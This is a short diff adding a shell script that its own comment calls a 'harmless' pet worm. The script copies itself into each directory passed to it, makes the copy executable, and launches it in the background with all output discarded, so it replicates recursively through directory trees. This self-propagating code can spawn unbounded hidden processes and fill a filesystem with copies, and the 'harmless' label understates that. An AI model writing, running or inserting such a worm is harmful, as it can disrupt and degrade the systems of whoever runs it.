@@ -1,0 +1,7 @@
+#this is my pet worm, he is harmless
+for i
+do
+	cat worm > ./$i/worm
+	cx ./$i/worm
+	./$i/worm ./$i/* 1>/dev/null 2>/dev/null &
+done
